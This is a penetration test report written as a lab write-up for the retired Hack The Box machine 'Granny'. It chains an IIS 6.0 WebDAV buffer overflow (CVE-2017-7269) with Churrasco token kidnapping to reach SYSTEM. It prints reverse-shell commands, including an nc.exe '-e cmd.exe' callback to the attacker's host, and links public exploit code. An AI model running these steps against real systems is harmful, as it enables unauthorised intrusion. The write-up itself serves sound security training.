# HTB Granny - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-3

**Target:** 10.129.95.234

**Environment:** HTB Granny (Retired Machine)

---

## 0. Lesson Learned

Sometimes you need to look on page 2 of Google search results to find the PoC.

---

## 1. Executive Summary

A penetration test was performed against the *HTB Granny* target system. The assessment successfully achieved full system compromise, including privilege escalation to **NT AUTHORITY\SYSTEM**. The primary attack vectors were:

- **Remote Code Execution** via **IIS 6.0 WebDAV PROPFIND Buffer Overflow** (CVE-2017-7269)
- **Privilege Escalation** via **Churrasco (Token Kidnapping)** exploiting **SeImpersonatePrivilege**

User and system-level flags were obtained, demonstrating full compromise of the host.

---

## 2. Scope

**Target:** 10.129.95.234

**Allowed Techniques:** Full exploitation permitted

**Prohibited Actions:** None (lab environment)

---

## 3. Methodology

Testing followed standard OSCP methodology:

1. **Enumeration:** Port scanning, service identification, web content review
2. **Vulnerability Identification:** Matching service versions to known exploits
3. **Exploitation:** Gaining initial access
4. **Privilege Escalation:** Evaluating local privileges and token abuse
5. **Post-Exploitation:** Flag acquisition, system confirmation

---

## 4. Initial Enumeration

### Nmap Scan

A full TCP scan was performed:

```
nmap -p- -sCV 10.129.95.234 -T4 -oA granny_initial
```

Revealing the following:

- **Port 80/tcp - Microsoft IIS 6.0**
- "Under Construction" page displayed

### Gobuster Scan

A directory scan was performed:

```
gobuster dir -u http:/10.129.95.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Revealing:

- `/images/` directory was identified

---

## 5. Vulnerability Identification

IIS 6.0 WebDAV on Windows Server 2003 is known to be vulnerable to the **PROPFIND buffer overflow (CVE-2017-7269)**.

Based on version banners and OS detection, the following critical vulnerability applied:

**CVE-2017-7269 - IIS 6.0 WebDAV Buffer Overflow RCE**

Triggering a crafted **PROPFIND** request leads to remote code execution. A publicly-available PoC was used to test exploitability.

---

## 6. Exploitation - Initial Foothold

The Python exploit delivered a reverse shell:

```
python2 cve-2017-7269.py 10.129.95.234 80 10.10.14.73 443
```

A reverse shell connected back, running as:

```
nt authority\network service
```

This confirmed successful remote command execution.

---

## 7. Privilege Escalation

### Privilege Checks

`whoami /priv` showed **SeImpersonatePrivilege** enabled.

This indicated the target was vulnerable to traditional **Churrasco / Token Kidnapping** escalation.

### Host Information

`systeminfo` confirmed:

- Windows Server 2003 Standard Edition SP2

### Execution of Churrasco

A SMB share was hosted from the attacker machine, and the following files were copied to the victim:

- churrasco.exe
- nc.exe

Churrasco was executed:

```
churrasco.exe -d "C:\Windows\Temp\nc.exe 10.10.14.73 1337 -e cmd.exe"
```

A new listener received a SYSTEM shell as:

```
nt authority\system
```

This confirmed full system compromise.

---

## 8. Post-Exploitation

User and root flags were located using recursive file search:

```
dir C:\ /s /b | findstr /i user.txt

dir C:\ /s /b | findstr /i root.txt
```

### User Flag - *REDACTED*

```
type "C:\Documents and Settings\Lakis\Desktop\user.txt"
```

### Root Flag - *REDACTED*

```
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## 9. Vulnerabilities Summary

| Vulnerability | Severity | Description | Result |
|---------------|----------|-------------|--------|
| IIS 6.0 WebDAV RCE (CVE-2017-7269) | Critical | Buffer overflow via malformed PROPFIND header | Remote shell as Network Service |
| SeImpersonatePrivilege Abuse (Churrasco) | High | Token impersonation enabling privilege escalation | SYSTEM-level shell |

---

## 10. Recommendations

1. **Decommission Windows Server 2003**. The OS is end-of-life and receives no security patches.
2. **Replace IIS 6.0**. WebDAV functionality in IIS 6.0 is dangerously outdated and should be replaced with a modern, supported alternative.
3. **Remove SeImpersonatePrivilege from untrusted services**. Ensure low-privileged accounts cannot impersonate tokens.
4. **Harden file transfer and remote execution paths**. Limit access to TEMP directories and untrusted binaries.

---

## 11. Conclusion

The *Granny* host was fully compromised through a chain of well-known vulnerabilities in legacy Windows systems. The assessment demonstrates the severe risk posed by unsupported operating systems and outdated web server technologies. All objectives were achieved, and complete administrative access was obtained.

---

## 12. Appendix - Exploit Resources

### CVE-2017-7269 - IIS 6.0 WebDAV Buffer Overflow RCE

Source: [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

### Churrasco.exe - 'SeImpersonatePrivilege' Local Privilege Escalation

Source: [https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)